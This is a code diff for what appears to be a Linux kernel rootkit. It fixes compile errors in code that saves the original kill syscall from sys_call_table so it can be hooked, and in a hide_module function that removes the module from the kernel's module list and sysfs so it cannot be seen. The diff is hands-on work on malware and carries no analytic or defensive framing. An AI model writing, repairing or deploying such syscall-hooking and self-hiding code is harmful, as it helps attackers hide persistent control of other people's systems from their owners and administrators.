@@ -43,7 +43,7 @@ rather, are called using struct pt_regs, which is a syscall wrapper*/
 // If we are in here, we need to use pt_regs to hook into syscalls
 #define PTREGS_SYSCALL_STUB 1
 // Function pointer to a syscall function
-typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs)
+typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs);
 // syscalls
 static ptregs_t orig_kill;
 
@@ -54,8 +54,8 @@ static orig_kill_t orig_kill;
 #endif
 
 static int store_original_syscalls(void) {
-#if PT_REGS_SYSCALL_STUB
-    orig_kill = (pt_regs_t)sys_call_table[__NR_kill];
+#if PTREGS_SYSCALL_STUB
+    orig_kill = (ptregs_t)sys_call_table[__NR_kill];
     printk(KERN_INFO "orig_kill table entry successfully stored\n");
 #else
     orig_kill = (orig_kill_t)sys_call_table[__NR_kill];
@@ -66,7 +66,7 @@ static int store_original_syscalls(void) {
 }
 
 static int hide_module(void) {
-    printk(KERN_INFO "Hiding module" THIS_MODULE->name);
+    printk(KERN_INFO "Hiding module");
     list_del(&THIS_MODULE->list);
     kobject_del(&THIS_MODULE->mkobj.kobj);
     return 0;
